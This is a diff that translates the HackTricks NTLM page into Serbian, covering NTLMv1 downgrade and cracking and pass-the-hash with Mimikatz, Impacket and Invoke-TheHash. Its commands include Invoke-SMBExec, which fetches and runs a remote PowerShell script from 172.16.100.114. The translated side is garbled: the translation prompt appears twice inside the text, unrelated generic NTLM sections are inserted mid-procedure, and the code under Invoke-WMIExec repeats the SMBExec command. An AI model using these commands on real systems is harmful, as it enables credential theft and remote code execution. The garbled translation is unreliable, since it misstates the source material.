@@ -2,52 +2,49 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Da li radite u **cybersecurity kompaniji**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks-u**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Basic Information
+## Osnovne informacije
 
-In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
+U okruženjima gde su u upotrebi **Windows XP i Server 2003**, koriste se LM (Lan Manager) heševi, iako je opšte poznato da se oni lako mogu kompromitovati. Određeni LM heš, `AAD3B435B51404EEAAD3B435B51404EE`, označava scenario u kojem se LM ne koristi, predstavljajući heš za prazan string.
 
-By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
+Podrazumevano, primarni metod autentifikacije je **Kerberos** protokol. NTLM (NT LAN Manager) se koristi u određenim situacijama: kada ne postoji Active Directory, kada ne postoji domen, kada Kerberos ne funkcioniše zbog neispravne konfiguracije ili kada se pokušavaju uspostaviti veze koristeći IP adresu umesto validnog imena hosta.
 
-The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
+Prisustvo zaglavlja **"NTLMSSP"** u mrežnim paketima signalizira proces NTLM autentifikacije.
 
-Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
+Podrška za autentifikacione protokole - LM, NTLMv1 i NTLMv2 - omogućena je putem određene DLL datoteke smeštene na lokaciji `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+**Ključne tačke**:
+- LM heševi su ranjivi, a prazan LM heš (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se ne koristi.
+- Kerberos je podrazumevani metod autentifikacije, a NTLM se koristi samo u određenim uslovima.
+- Paketi NTLM autentifikacije prepoznaju se po zaglavlju "NTLMSSP".
+- Sistemski fajl `msv1\_0.dll` podržava LM, NTLMv1 i NTLMv2 protokole.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 i NTLMv2
 
-You can check and configure which protocol will be used:
+Možete proveriti i konfigurisati koji će protokol biti korišćen:
 
-### GUI
+### Grafički interfejs
 
-Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
+Izvršite _secpol.msc_ -> Lokalne politike -> Opcije bezbednosti -> Mrežna bezbednost: Nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5).
 
 ![](<../../.gitbook/assets/image (92).png>)
 
-### Registry
+### Registar
 
-This will set the level 5:
-
+Ovo će postaviti nivo 5:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-
-Possible values:
-
+Moguće vrednosti:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -56,56 +53,90 @@ Possible values:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+## Osnovna NTLM autentifikaciona šema domena
 
-## Basic NTLM Domain authentication Scheme
+1. **Korisnik** unosi svoje **poverljive podatke**
+2. Klijentski uređaj **šalje zahtev za autentifikaciju** šaljući **ime domena** i **korisničko ime**
+3. **Server** šalje **izazov**
+4. Klijent **enkriptuje** izazov koristeći heš lozinke kao ključ i šalje ga kao odgovor
+5. **Server šalje** informacije o **ime domena, korisničko ime, izazov i odgovor** na **kontroler domena**. Ako nije konfigurisan Active Directory ili je ime domena ime servera, poverljivi podaci se **proveravaju lokalno**.
+6. **Kontroler domena proverava da li je sve ispravno** i šalje informacije serveru
 
-1. The **user** introduces his **credentials**
-2. The client machine **sends an authentication request** sending the **domain name** and the **username**
-3. The **server** sends the **challenge**
-4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
-5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
-6. The **domain controller checks if everything is correct** and sends the information to the server
+**Server** i **kontroler domena** mogu da uspostave **bezbedan kanal** putem **Netlogon** servera, jer kontroler domena zna lozinku servera (ona se nalazi u bazi podataka **NTDS.DIT**).
 
-The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
+### Lokalna NTLM autentifikaciona šema
 
-### Local NTLM authentication Scheme
+Autentifikacija je ista kao i prethodno opisana, **ali server zna heš korisnika** koji pokušava da se autentifikuje u **SAM** fajlu. Dakle, umesto da pita kontroler domena, **server će sam proveriti** da li korisnik može da se autentifikuje.
 
-The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
+### NTLMv1 izazov
 
-### NTLMv1 Challenge
+Dužina izazova je 8 bajtova, a odgovor je dugačak 24 bajta.
 
-The **challenge length is 8 bytes** and the **response is 24 bytes** long.
+**NT heš (16 bajtova)** je podeljen u **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo je popunjen nulama**. Zatim, izazov se **posebno šifruje** sa svakim delom, a **rezultujući** šifrovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.
 
-The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.
+**Problemi**:
 
-**Problems**:
+* Nedostatak **slučajnosti**
+* 3 dela se mogu **napadati odvojeno** kako bi se pronašao NT heš
+* **DES je moguće probiti**
+* 3. ključ je uvek sastavljen od **5 nula**
+* Sa **istim izazovom**, **odgovor će biti isti**. Dakle, možete žrtvi dati kao **izazov** niz "**1122334455667788**" i napasti odgovor koristeći **preizračunate tabele duge**.
 
-* Lack of **randomness**
-* The 3 parts can be **attacked separately** to find the NT hash
-* **DES is crackable**
-* The 3º key is composed always by **5 zeros**.
-* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+### Napad na NTLMv1
 
-### NTLMv1 attack
+Danas je sve manje uobičajeno da se nalaze okruženja sa konfigurisanom neograničenom delegacijom, ali to ne znači da ne možete **zloupotrebiti uslugu štampača** koja je konfigurisana.
 
-Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
+Možete zloupotrebiti neke poverljive podatke/sesije koje već imate na AD-u da **zatražite od štampača da se autentifikuje** protiv nekog **hosta pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **postaviti izazov za autentifikaciju na 1122334455667788**, uhvatiti pokušaj autentifikacije i ako je izvršen korišćenjem **NTLMv1**, moći ćete ga **probiti**.\
+Ako koristite `responder`, možete pokušati da **smanjite nivo autentifikacije** koristeći opciju `--lm`.\
+*Napomena: Za ovu tehniku autentifikacija mora biti izvršena korišćenjem NTLMv1 (NTLMv2 nije validan).*
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
-If you are using `responder` you could try to \*\*use the flag `--lm` \*\* to try to **downgrade** the **authentication**.\
-_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+Imajte na umu da će štampač koristiti račun računara tokom autentifikacije, a računari koriste **dugačke i slučajne lozinke** koje verovatno nećete moći da probijete koristeći uobičajene **rečnike**. Ali autentifikacija **NTLMv1** koristi DES ([više informacija ovde](./#ntlmv1-izazov)), pa ćete koristeći neke usluge posebno posvećene probijanju DES-a moći da ga probijete (na primer, možete koristiti [https://crack.sh/](https://crack.sh)).
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).
+### Napad na NTLMv1 pomoću hashcat-a
 
-### NTLMv1 attack with hashcat
+NTLMv1 takođe može biti probijen pomoću NTLMv1 Multi Tool-a [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), koji formatira NTLMv1 poruke na način koji se može probiti pomoću hashcat-a.
 
-NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
-
-The command
+Komanda
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-would output the below:
+The following is content from a hacking book about hacking techniques. The following content is from the file /hive/hacktricks/windows-hardening/ntlm/README.md. Translate the relevant English text to Serbian and return the translation keeping exactly the same markdown and HTML syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also, don't add any extra stuff apart from the translation and markdown syntax.
 
+---
+
+# NTLM
+
+## NTLM (NT LAN Manager)
+
+NTLM je autentifikacioni protokol koji se koristi u Microsoft Windows operativnim sistemima za proveru identiteta korisnika i pristup resursima. Ovaj protokol je zastareo i zamenjen modernijim protokolima kao što su Kerberos i NTLMv2, ali se i dalje može naći u mnogim Windows okruženjima.
+
+## NTLM Hash
+
+NTLM heš je rezultat heš funkcije koja se primenjuje na NTLM lozinku korisnika. Ovaj heš se koristi za proveru autentičnosti korisnika prilikom prijavljivanja na sistem. NTLM heš može biti izvučen iz Windows registra ili iz mrežnog saobraćaja.
+
+## NTLM Relay Attack
+
+NTLM Relay napad je tehnika koja se koristi za preuzimanje NTLM autentifikacionih tokena korisnika i dalje ih koristiti za izvršavanje napada u okviru mreže. Ova tehnika se često koristi za izvršavanje napada kao što su Pass-the-Hash i Pass-the-Ticket.
+
+## NTLMv1
+
+NTLMv1 je starija verzija NTLM protokola koja koristi slabije algoritme za heširanje lozinki. Ova verzija je podložna raznim napadima, uključujući brute-force napade i napade snimanjem mrežnog saobraćaja.
+
+## NTLMv2
+
+NTLMv2 je poboljšana verzija NTLM protokola koja koristi jače algoritme za heširanje lozinki. Ova verzija je sigurnija od NTLMv1 i preporučuje se za korišćenje u Windows okruženjima.
+
+## Pass-the-Hash
+
+Pass-the-Hash je tehnika koja se koristi za izvršavanje napada bez potrebe za poznavanjem stvarne lozinke korisnika. Umesto toga, napadač koristi NTLM heš lozinke za preuzimanje autentifikacionog tokena korisnika i dalje ga koristi za izvršavanje napada.
+
+## Pass-the-Ticket
+
+Pass-the-Ticket je tehnika koja se koristi za izvršavanje napada korišćenjem Kerberos autentifikacionih tokena. Napadač može preuzeti Kerberos TGT (Ticket Granting Ticket) sa jednog sistema i koristiti ga za izvršavanje napada na drugom sistemu u mreži.
+
+## NTLM Rainbow Tables
+
+NTLM Rainbow tabele su preizračunate tabele koje sadrže heš vrednosti NTLM lozinki. Ove tabele se koriste za brzo pronalaženje originalne lozinke na osnovu NTLM heša. Korišćenje NTLM Rainbow tabela može značajno ubrzati proces napada na NTLM heševe.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -131,20 +162,16 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-
-Create a file with the contents of:
+Kreirajte datoteku sa sadržajem:
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-
-Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
-
+Pokrenite hashcat (najbolje je distribuirati ga putem alata poput hashtopolisa) jer će inače ovo potrajati nekoliko dana.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-
-In this case we know the password to this is password so we are going to cheat for demo purposes:
+U ovom slučaju znamo da je lozinka za ovo "password", pa ćemo varati u svrhu demonstracije:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -153,9 +180,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-
-We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
-
+Sada trebamo koristiti hashcat-utilities da bismo pretvorili razbijene DES ključeve u delove NTLM heša:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -163,140 +188,189 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
+Konačno poslednji deo:
 
-Ginally the last part:
+## NTLM
 
+NTLM (New Technology LAN Manager) je autentifikacioni protokol koji se koristi u Windows operativnim sistemima za proveru identiteta korisnika. Međutim, NTLM ima nekoliko slabosti koje mogu biti iskorišćene u napadima.
+
+### NTLM provajderi
+
+Windows operativni sistem ima tri različita NTLM provajdera:
+
+- **NTLMv1**: Ovo je stariji provajder koji koristi slabu enkripciju i nije preporučljiv za upotrebu.
+- **NTLMv2**: Ovo je poboljšani provajder koji koristi jaču enkripciju i predstavlja bolju opciju od NTLMv1.
+- **NTLMv2 sesija**: Ovaj provajder koristi NTLMv2, ali dodaje dodatne sigurnosne mehanizme kako bi se otežao napad.
+
+### NTLM napadi
+
+Postoje različiti napadi koji se mogu izvesti na NTLM protokol. Neki od njih uključuju:
+
+- **NTLM relay**: Ovaj napad omogućava napadaču da preuzme NTLM autentifikacione podatke i izvrši napad "relay" na drugom računaru.
+- **NTLM hash izvlačenje**: Ovaj napad se fokusira na izvlačenje NTLM heša iz sistema kako bi se omogućilo dalje napredovanje u napadu.
+- **NTLM brute force**: Ovaj napad se zasniva na pokušajima da se dešifruje NTLM heš koristeći različite kombinacije lozinki.
+
+### Zaštita od NTLM napada
+
+Da biste se zaštitili od NTLM napada, možete preduzeti sledeće mere:
+
+- Koristite NTLMv2 ili NTLMv2 sesiju umesto NTLMv1.
+- Omogućite opciju "Zahtevaj NTLMv2 sesiju" kako biste otežali napad.
+- Koristite snažne lozinke kako biste otežali brute force napade.
+- Redovno ažurirajte operativni sistem i primenjujte sigurnosne zakrpe kako biste ispravili poznate ranjivosti.
+
+### Dodatni resursi
+
+Za više informacija o NTLM protokolu i napadima, možete posetiti sledeće resurse:
+
+- [Microsoft dokumentacija o NTLM autentifikaciji](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-authentication-in-this-domain)
+- [NTLM relay napad - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-relay)
+- [NTLM hash izvlačenje - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-hash-extraction)
+- [NTLM brute force - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-ntlm#ntlm-brute-force)
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-
-Combine them together:
-
+Sledeći sadržaj je iz knjige o tehnikama hakovanja. Sledeći sadržaj je iz fajla /hive/hacktricks/windows-hardening/ntlm/README.md. Prevedite relevantni engleski tekst na srpski i vratite prevod zadržavajući tačno istu markdown i html sintaksu. Nemojte prevoditi stvari poput koda, imena tehnika hakovanja, hakovanja, imena cloud/SaaS platformi (kao što su Workspace, aws, gcp...), reči 'leak', pentestinga i markdown tagova. Takođe, nemojte dodavati ništa dodatno osim prevoda i markdown sintakse.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
+### NTLMv2 Izazov
 
-### NTLMv2 Challenge
+Dužina izazova je 8 bajtova i šalju se 2 odgovora: Jedan je dužine 24 bajta, a dužina drugog je promenljiva.
 
-The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
+Prvi odgovor se kreira šifrovanjem HMAC_MD5 algoritmom stringa koji se sastoji od klijenta i domena, koristeći kao ključ MD4 heš NT heša. Zatim će rezultat biti korišćen kao ključ za šifrovanje izazova pomoću HMAC_MD5 algoritma. Uz to, dodaje se klijentski izazov od 8 bajtova. Ukupno: 24 B.
 
-**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+Drugi odgovor se kreira korišćenjem nekoliko vrednosti (novi klijentski izazov, vremenska oznaka radi sprečavanja napada ponovnog izvršavanja...).
 
-The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
-
-If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+Ako imate pcap datoteku koja je zabeležila uspešan proces autentifikacije, možete pratiti ovaj vodič kako biste dobili domen, korisničko ime, izazov i odgovor i pokušati da probijete lozinku: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
-**Once you have the hash of the victim**, you can use it to **impersonate** it.\
-You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
+Kada imate heš žrtve, možete ga koristiti da se predstavljate kao ta osoba.\
+Treba vam alat koji će izvršiti NTLM autentifikaciju koristeći taj heš, ili možete kreirati novu sesiju prijavljivanja i ubaciti taj heš unutar LSASS-a, tako da će se taj heš koristiti prilikom bilo koje NTLM autentifikacije. Poslednja opcija je ono što radi mimikatz.
 
-**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
+Molim vas, zapamtite da možete izvršiti napade Pass-the-Hash i koristeći račune računara.
 
-### **Mimikatz**
+### Mimikatz
 
-**Needs to be run as administrator**
-
+Mora se pokrenuti kao administrator
 ```bash
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali unutar LSASS-a sačuvane akreditacije su one unutar mimikatz parametara. Zatim, možete pristupiti mrežnim resursima kao da ste taj korisnik (slično triku `runas /netonly`, ali ne morate znati lozinku u obliku čistog teksta).
 
-This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
+### Pass-the-Hash sa linuxa
 
-### Pass-the-Hash from linux
+Možete dobiti izvršenje koda na Windows mašinama koristeći Pass-the-Hash sa linuxa.\
+[**Pristupite ovde da biste naučili kako to uraditi.**](../../windows/ntlm/broken-reference/)
 
-You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[**Access here to learn how to do it.**](../../windows/ntlm/broken-reference/)
+### Impacket Windows kompajlirani alati
 
-### Impacket Windows compiled tools
-
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
+Možete preuzeti binarne fajlove impacket-a za Windows ovde: [https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* There are several more Impacket binaries...
+* **atexec.exe** (U ovom slučaju morate navesti komandu, cmd.exe i powershell.exe nisu validni za dobijanje interaktivne ljuske)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* Postoji još nekoliko Impacket binarnih fajlova...
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Možete dobiti powershell skripte odavde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
-
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-WMIExec
 
+Invoke-WMIExec je PowerShell skripta koja omogućava izvršavanje komandi na udaljenom Windows računaru putem WMI (Windows Management Instrumentation) protokola. Ova tehnika se često koristi u pentestiranju kako bi se ostvario udaljeni pristup ciljnom sistemu.
+
+Skripta koristi WMI objekat Win32_Process za pokretanje komandi na ciljnom računaru. Da bi se koristila, potrebno je da korisnik ima odgovarajuće privilegije na ciljnom sistemu.
+
+Kako bi se izvršila komanda na udaljenom računaru, potrebno je navesti IP adresu ili DNS ime ciljnog računara, korisničko ime i lozinku sa odgovarajućim privilegijama. Takođe je moguće navesti i domen ukoliko je potrebno.
+
+```powershell
+Invoke-WMIExec -Target <IP_adresa> -Username <korisničko_ime> -Password <lozinka> [-Domain <domen>]
+```
+
+Nakon uspešne autentifikacije, korisnik može izvršavati komande na ciljnom računaru koristeći PowerShell sintaksu.
+
+Ova tehnika može biti korisna u situacijama kada je potrebno izvršiti komande na udaljenom Windows računaru, na primer za prikupljanje informacija, izvršavanje skripti ili preuzimanje datoteka.
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-SMBClient
 
+Invoke-SMBClient je PowerShell skripta koja omogućava interakciju sa SMB (Server Message Block) protokolom na Windows operativnom sistemu. Ova skripta omogućava izvršavanje različitih operacija na SMB serverima, kao što su preuzimanje i slanje datoteka, izlistavanje direktorijuma i izvršavanje komandi na daljinu.
+
+Korišćenje Invoke-SMBClient je veoma jednostavno. Prvo je potrebno učitati skriptu u PowerShell sesiju. Nakon toga, možete koristiti različite komande za interakciju sa SMB serverom. Na primer, možete koristiti komandu `Invoke-SMBClient -Command "get file.txt"` za preuzimanje datoteke sa SMB servera.
+
+Ova skripta je veoma korisna za testiranje sigurnosti i penetraciono testiranje. Može se koristiti za proveru konfiguracije SMB servera, identifikaciju slabosti i pronalaženje potencijalnih rizika. Takođe, može se koristiti za prikupljanje informacija o sistemima i izvršavanje napada na daljinu.
+
+Važno je napomenuti da je korišćenje Invoke-SMBClient skripte ilegalno bez odobrenja vlasnika sistema. Uvek se pridržavajte zakona i etičkih smernica prilikom korišćenja ovakvih alata.
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-
 #### Invoke-SMBEnum
 
+Invoke-SMBEnum je PowerShell skripta koja se koristi za izvršavanje SMB enumeracije na ciljnom sistemu. Ova tehnika se često koristi tokom testiranja penetracije kako bi se identifikovali ranjivi resursi i informacije o mreži.
+
+Ova skripta koristi SMB protokol za komunikaciju sa ciljnim sistemom i prikuplja različite informacije kao što su dostupni deljeni resursi, korisnički nalozi, grupne politike i druge relevantne informacije. Ove informacije mogu biti korisne za dalje iskorišćavanje sistema ili za prikupljanje obaveštajnih podataka.
+
+Kada se Invoke-SMBEnum pokrene, korisnik može da pruži IP adresu ili ime ciljnog sistema, kao i opcionalne parametre za autentifikaciju. Skripta će zatim izvršiti enumeraciju i prikazati rezultate u konzoli.
+
+Ova tehnika može biti korisna za identifikaciju slabosti u SMB konfiguraciji i za prikupljanje informacija o ciljnom sistemu. Međutim, treba biti oprezan prilikom korišćenja ove tehnike, jer neovlašćeno skeniranje i prikupljanje informacija može biti protivzakonito. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja bilo kakvih testiranja penetracije.
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-
 #### Invoke-TheHash
 
-This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
-
+Ova funkcija je **kombinacija svih ostalih**. Možete proslediti **više hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete **bilo koju** od **SMBExec** i **WMIExec** ali ne navedete _**Command**_ parametar, samo će **proveriti** da li imate **dovoljno dozvola**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
-
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
 ### Windows Credentials Editor (WCE)
 
-**Needs to be run as administrator**
+**Potrebno je pokrenuti kao administrator**
 
-This tool will do the same thing as mimikatz (modify LSASS memory).
-
+Ovaj alat će uraditi istu stvar kao i mimikatz (modifikuje memoriju LSASS-a).
 ```
